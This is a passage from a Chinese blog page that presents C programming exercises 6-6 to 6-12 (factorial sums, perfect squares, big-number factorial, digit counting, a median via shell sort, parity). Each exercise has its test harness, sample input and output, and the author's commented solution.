申请node变量对应大小的内存</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;Data);</span><br><span class="line">        p-&gt;Next = L;  L = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, FactorialSum(L));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">5 3 6</span><br><span class="line">输出</span><br><span class="line">846</span><br><span class="line"></span><br><span class="line">阶乘 5!+3!+6!</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FactorialSum</span><span class="params">( List L )</span>&#123;</span><br><span class="line">  <span class="type">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">  List p = L;</span><br><span class="line">  <span class="comment">// L 赋值给 p, p 变成 null, L不变</span></span><br><span class="line">  <span class="keyword">while</span>(p) &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= p-&gt;Data; i++)&#123;</span><br><span class="line">      n *= i; <span class="comment">// n = n*i </span></span><br><span class="line">    &#125;</span><br><span class="line">    sum += n;</span><br><span class="line">    p = p-&gt;Next;</span><br><span class="line">    <span class="comment">// p-&gt;next 赋值给 p</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-7-统计某类完全平方数-20分"><a href="#6-7-统计某类完全平方数-20分" class="headerlink" title="6-7 统计某类完全平方数 (20分)"></a>6-7 统计某类完全平方数 (20分)</h2><p>本题要求实现一个函数，判断任一给定整数N是否满足条件：它是完全平方数，又至少有两位数字相同，如144、676等。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsTheNumber</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>N</code> 是用户传入的参数。如果 <code>N</code> 满足条件，则该函数必须返回1，否则返回0。</p>
<h3 id="裁判测试程序样例：-6"><a href="#裁判测试程序样例：-6" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsTheNumber</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n1, n2, i, cnt;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n1, &amp;n2);</span><br><span class="line">    cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=n1; i&lt;=n2; i++ ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( IsTheNumber(i) )</span><br><span class="line">            cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cnt = %d\n&quot;</span>, cnt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">105 500</span><br><span class="line">输出</span><br><span class="line">cnt = 6</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsTheNumber</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, temp[<span class="number">500</span>], count=<span class="number">0</span>, i, n=N;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;=<span class="number">0</span>) &#123; <span class="comment">// 输入值为负数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a = (<span class="type">int</span>)<span class="built_in">sqrt</span>(N); <span class="comment">// 开根号</span></span><br><span class="line">    <span class="comment">// 强制转换整型</span></span><br><span class="line">    <span class="keyword">if</span> (a*a==N) &#123; </span><br><span class="line">    <span class="comment">// 判断是否为完全平方数</span></span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            temp[count] = n%<span class="number">10</span>; <span class="comment">// 取个位</span></span><br><span class="line">            n = n/<span class="number">10</span>; <span class="comment">// 取是百十位</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;count; i++) &#123; </span><br><span class="line">                <span class="keyword">if</span> (temp[count] == temp[i]) &#123;</span><br><span class="line">                <span class="comment">// 存在与之前取出的数字相同的返回为 1</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            count += <span class="number">1</span>; <span class="comment">// count = count + 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-8-简单阶乘计算-10分"><a href="#6-8-简单阶乘计算-10分" class="headerlink" title="6-8 简单阶乘计算 (10分)"></a>6-8 简单阶乘计算 (10分)</h2><p>本题要求实现一个计算非负整数阶乘的简单函数。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Factorial</span><span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>N</code> 是用户传入的参数，其值不超过12。如果 <code>N</code> 是非负整数，则该函数必须返回N的阶乘，否则返回0。</p>
<h3 id="裁判测试程序样例：-7"><a href="#裁判测试程序样例：-7" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Factorial</span><span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> N, NF;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    NF = Factorial(N); </span><br><span class="line">    <span class="comment">// 阶乘函数 Factorial(5) = 5!</span></span><br><span class="line">    <span class="keyword">if</span> (NF)  <span class="built_in">printf</span>(<span class="string">&quot;%d! = %d\n&quot;</span>, N, NF);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Invalid input\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">5</span><br><span class="line">输出</span><br><span class="line">5! = 120</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-6"><a href="#解答-6" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Factorial</span><span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, sum=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (N&gt;<span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        sum *= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-9-统计个位数字-15分"><a href="#6-9-统计个位数字-15分" class="headerlink" title="6-9 统计个位数字 (15分)"></a>6-9 统计个位数字 (15分)</h2><p>本题要求实现一个函数，可统计任一整数中某个位数出现的次数。例如-21252中，2出现了3次，则该函数应该返回3。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Count_Digit</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N, <span class="type">const</span> <span class="type">int</span> D )</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>N</code> 和 <code>D</code> 都是用户传入的参数。 <code>N</code> 的值不超过int的范围；<code>D</code>是[0, 9]区间内的个位数。函数须返回N中D出现的次数。</p>
<h3 id="裁判测试程序样例：-8"><a href="#裁判测试程序样例：-8" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Count_Digit</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N, <span class="type">const</span> <span class="type">int</span> D )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> N, D;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;N, &amp;D);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, Count_Digit(N, D));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">-21252 2</span><br><span class="line">输出</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-7"><a href="#解答-7" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Count_Digit</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N, <span class="type">const</span> <span class="type">int</span> D )</span>&#123;</span><br><span class="line">    <span class="type">int</span> M=N,cnt=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> ( N==<span class="number">0</span> &amp;&amp; D==<span class="number">0</span> )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> ( N&lt;<span class="number">0</span> ) &#123;</span><br><span class="line">	    M = -N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>( M!=<span class="number">0</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( D == M%<span class="number">10</span> ) <span class="comment">// M 除以10的余数（求当前个位的数字）</span></span><br><span class="line">		    cnt++;</span><br><span class="line">		    M/=<span class="number">10</span>; <span class="comment">// M 减少最后一位</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> cnt;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-10-阶乘计算升级版-20分"><a href="#6-10-阶乘计算升级版-20分" class="headerlink" title="6-10 阶乘计算升级版 (20分)"></a>6-10 阶乘计算升级版 (20分)</h2><p>本题要求实现一个打印非负整数阶乘的函数。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Print_Factorial</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>N</code> 是用户传入的参数，其值不超过 <code>1000</code>。如果 <code>N</code> 是非负整数，则该函数必须在一行中打印出 <code>N!</code> 的值，否则打印“Invalid input”</p>
<h3 id="裁判测试程序样例：-9"><a href="#裁判测试程序样例：-9" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print_Factorial</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    Print_Factorial(N);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">15</span><br><span class="line">输出</span><br><span class="line">1307674368000</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-8"><a href="#解答-8" class="headerlink" title="解答"></a>解答</h3><p>易错点有2个</p>
<ol>
<li>当N过大时，<code>long int</code> 也无法满足解的要求</li>
<li>用数组存放结果时，要注意 <code>进位</code> 在进行最高位计算完毕后，进位可能是多位数；结果在数组中存放的是0~k-1位且高位在后，低位在前</li>
</ol>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Print_Factorial</span> <span class="params">( <span class="type">const</span> <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(N&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">int</span> sum=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(N&lt;=<span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">                sum *= i;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ld&quot;</span>,sum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (N &gt; <span class="number">12</span> &amp;&amp; N &lt;= <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="type">int</span> sum[<span class="number">3000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">/* 确保保存最终运算结果的数组足够大：</span></span><br><span class="line"><span class="comment">        1-9相乘最多有9位，10-99相乘最多有2*90=180位</span></span><br><span class="line"><span class="comment">        100-999相乘最多有3*900=2700位，1000是4*1=4位</span></span><br><span class="line"><span class="comment">        总计2893位 */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> temp, i, j;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">1</span>;  <span class="comment">// 位数</span></span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;  <span class="comment">// 进位</span></span><br><span class="line">        sum[<span class="number">0</span>] = <span class="number">1</span>;   <span class="comment">//将结果先初始化为1</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=N;i++) &#123; <span class="comment">//开始阶乘，阶乘元素从2开始</span></span><br><span class="line">        <span class="comment">//和平时乘法方法相同，将临时结果的每位与阶乘元素相乘</span></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;k;j++) &#123;</span><br><span class="line">                </span><br><span class="line">                temp = sum[j]*i + n;</span><br><span class="line">                <span class="comment">//相应阶乘中的一项与当前所得临时结果的某位相乘（加上进位）</span></span><br><span class="line">                </span><br><span class="line">                sum[j] = temp%<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//更新临时结果的位上信息</span></span><br><span class="line">                </span><br><span class="line">                n = temp/<span class="number">10</span>;</span><br><span class="line">                <span class="comment">//看是否有进位</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(n!=<span class="number">0</span> &amp;&amp; j==k<span class="number">-1</span>)&#123; <span class="comment">//如果有进位</span></span><br><span class="line">                    k++;   <span class="comment">//处理最后进位为两位</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=k<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,sum[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为long数据类型表示的数字范围到 <code>2147483647</code><br>而<code>12!</code>正好是9位数，所以从12为分界点</p>
<p>采用数组方法存储，设置进位、位数、临时值。</p>
<p>临时值一定要每一位都与第i个元素相乘。</p>
<hr>
<h2 id="6-11-求自定类型元素序列的中位数-25分"><a href="#6-11-求自定类型元素序列的中位数-25分" class="headerlink" title="6-11 求自定类型元素序列的中位数 (25分)"></a>6-11 求自定类型元素序列的中位数 (25分)</h2><p>本题要求实现一个函数，求 <code>N</code> 个集合元素 <code>A[]</code> 的中位数，即序列中第<code>⌊(N+1)/2⌋</code>大的元素。其中集合元素的类型为自定义的 <code>ElementType</code>。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElementType <span class="title function_">Median</span><span class="params">( ElementType A[], <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中给定集合元素存放在数组<code>A[]</code>中，正整数N是数组元素个数。该函数须返回N个A[]元素的中位数，其值也必须是 <code>ElementType</code>类型。</p>
<h3 id="裁判测试程序样例：-10"><a href="#裁判测试程序样例：-10" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> ElementType;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">Median</span><span class="params">( ElementType A[], <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ElementType A[MAXN];</span><br><span class="line">    <span class="type">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;A[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, Median(A, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">输出</span><br><span class="line">12.30</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-9"><a href="#解答-9" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElementType <span class="title function_">Median</span><span class="params">( ElementType A[], <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    ElementType temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> gap=N/<span class="number">2</span>; gap&gt;<span class="number">0</span>; gap=gap/<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">//gap是每次排序分组的间隔，每次间隔缩小1/2</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=gap; i&lt;N; i++) &#123;</span><br><span class="line">    <span class="comment">//相当于在同一组内采用直接插入排序</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i-gap; j&gt;=<span class="number">0</span> &amp;&amp; A[j]&gt;A[j+gap]; j=j-gap) &#123;</span><br><span class="line">    <span class="comment">//如果同一组内前一个元素大于相隔gap个位置的元素，则两者交换位置 </span></span><br><span class="line">                temp = A[j];</span><br><span class="line">                A[j] = A[j+gap];</span><br><span class="line">                A[j+gap] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A[N/<span class="number">2</span>]; <span class="comment">// 返回中间元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">input:</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">5 2 1 3 6</span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">i=2, gap=2, j=0</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 1.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">i=3, gap=1, j=2</span></span><br><span class="line"><span class="comment">temp: 5.00</span></span><br><span class="line"><span class="comment">A[j]: 3.00</span></span><br><span class="line"><span class="comment">A[j+gap]: 5.00</span></span><br><span class="line"><span class="comment">3.00</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-12-判断奇偶性-10分"><a href="#6-12-判断奇偶性-10分" class="headerlink" title="6-12 判断奇偶性 (10分)"></a>6-12 判断奇偶性 (10分)</h2><p>本题要求实现判断给定整数奇偶性的函数。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">even</span><span class="params">( <span class="type">int</span> n )</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>n</code> 是用户传入的整型参数。当 <code>n为偶数</code> 时，函数返回1；<code>n为奇数</code> 时返回0。注意：0是偶数。</p>
<h3 id="裁判测试程序样例：-11"><a href="#裁判测试程序样例：-11" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">even</span><span class="params">( <span class="type">int</span> n )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">if</span> (even(n))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d is even.\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d is odd.\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">-6</span><br><span class="line">5</span><br><span class="line">输出</span><br><span class="line">-6 is even.</span><br><span class="line">5 is odd.</span><br></pre></td></tr></table></figure></div>

